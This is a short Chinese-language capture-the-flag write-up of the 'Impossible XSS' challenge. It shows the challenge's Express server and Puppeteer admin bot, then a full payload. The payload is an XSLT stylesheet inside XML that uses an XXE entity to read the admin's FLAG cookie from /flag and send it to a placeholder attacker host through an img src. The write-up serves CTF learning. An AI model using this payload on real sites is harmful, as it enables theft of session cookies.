---
tags:
  - XXE
  - XSLT
---

# Impossible XSS

题目代码量很少。

??? info "app.js"
    ```js
    app.get('/', (req, res) => {
        // free xss, how hard could it be?
        res.end(req.query?.xss ?? 'welcome to impossible-xss');
    });

    app.get('/flag', (req, res) => {
        // flag in admin bot's FLAG cookie
        res.end(req.cookies?.FLAG ?? 'dice{fakeflag}');
    });
    ```


??? info "admin.js"
    ```js
    // nodejs 16+
    // npm i puppeteer
    // usage: node adminbot.js [url]
    const fs = require('fs');
    const puppeteer = require('puppeteer');

    const flag = fs.readFileSync('./flag.txt', 'utf8').trim();

    const challenge = {
    name: 'impossible-xss admin bot',
    urlRegex: /^https:\/\/impossible-xss.mc.ax\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto('https://impossible-xss.mc.ax', { timeout: 3000, waitUntil: 'domcontentloaded' });

        // you wish it was that easy
        await page.setCookie({
            "name": "FLAG",
            "value": flag,
            "domain": "impossible-xss.mc.ax",
            "path": "/",
            "httpOnly": true,
            "secure": true,
            "sameSite": "Strict"
        });
        await page.setJavaScriptEnabled(false);

        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(3000);
    }
    }

    const sleep = time => new Promise(resolve => setTimeout(resolve, time))
    const url = process.argv[2]
    const regex = challenge.urlRegex ?? /^https?:\/\/.*/
    if (!regex.test(url)) {
    throw new Error('invalid url')
    }


    (async () => {
    const browser = await puppeteer.launch({
        pipe: true,
        dumpio: true,
        args: ['--js-flags=--jitless', '--no-sandbox'],
    })
    const ctx = await browser.createIncognitoBrowserContext()
    console.log(`Starting...`);
    await Promise.race([
        challenge.handler(url, ctx),
        sleep(challenge.timeout),
    ]);
    await browser.close();
    })();
    ```

突破点在于 `res.end`，由于其直接返回内容，没有指定 `Content-Type`，因此会由 chrome 自行解析，比如是一个 XML 格式，那么便会解析成 xml。

![202302081315801](https://cdn.silente.top/img/202302081315801.png)

然后利用 [XSLT](https://developer.mozilla.org/en-US/docs/Web/XSLT) 进行 XXE 外带 cookie。


```js
xmls = `<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/foo">
    <HTML>
      <HEAD>
        <TITLE></TITLE>
      </HEAD>
      <BODY>
        <img>
          <xsl:attribute name="src">
            http://ip?&xxe;
          </xsl:attribute>
        </img>
      </BODY>
    </HTML>
  </xsl:template>
</xsl:stylesheet>`

xml=`<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(xmls)}"?>
<foo></foo>`
xss=encodeURIComponent(xml)
```

第一次见这样打 XXE 的题hh